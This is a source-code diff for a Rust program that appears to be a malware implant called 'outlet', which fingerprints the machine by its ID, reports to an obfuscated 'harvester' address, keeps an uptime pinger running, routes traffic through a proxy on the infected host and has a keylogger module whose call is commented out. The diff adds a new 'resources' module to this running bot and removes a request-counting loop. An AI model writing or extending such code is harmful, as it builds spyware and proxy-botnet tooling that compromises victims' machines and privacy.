@@ -30,6 +30,9 @@ pub use keylogger::keylogger;
 mod proxy;
 pub use proxy::proxy;
 
+mod resources;
+pub use resources::resources;
+
 static HARVESTER_URL: Lazy<&'static str> = Lazy::new(|| muddy!("localhost:6767"));
 static MACHINE_ID: Lazy<String> =
     Lazy::new(|| machine_uid::machine_id::get_machine_id().unwrap_or("unknown".into()));
@@ -47,28 +50,13 @@ async fn main() {
         .filter_module("trust_dns_resolver", LevelFilter::Error)
         .init();
 
-    init_http_logger(LevelFilter::Info).unwrap();
+    // init_http_logger(LevelFilter::Info).unwrap();
 
     info!("outlet inited with machine id: {:?}", *MACHINE_ID);
 
     let global_state = Arc::new(GlobalState {
         request_counter: 0.into(),
     });
-
-    {
-        let global_state = global_state.clone();
-        tokio::spawn(async move {
-            loop {
-                let old = global_state.request_counter.load(Ordering::Relaxed);
-                sleep(Duration::from_secs(REQ_FEEDBACK_SPEED_SECS)).await;
-                let new = global_state.request_counter.load(Ordering::Relaxed);
-                info!(
-                    "requests per {REQ_FEEDBACK_SPEED_SECS} seconds : {}",
-                    new - old
-                );
-            }
-        });
-    }
 
     let mut headers = HeaderMap::new();
     headers.insert("machine-id", HeaderValue::from_str(&MACHINE_ID).unwrap());
@@ -85,7 +73,8 @@ async fn main() {
 
     uptime_pinger(reqwest_client.clone());
     // keylogger(reqwest_client.to_owned());
-    proxy(reqwest_client.to_owned(), global_state);
+    proxy(reqwest_client.to_owned(), global_state.to_owned());
+    resources(global_state.to_owned(), reqwest_client.to_owned());
 
     info!("successfully inited, running forever!");
     pending::<()>().await;
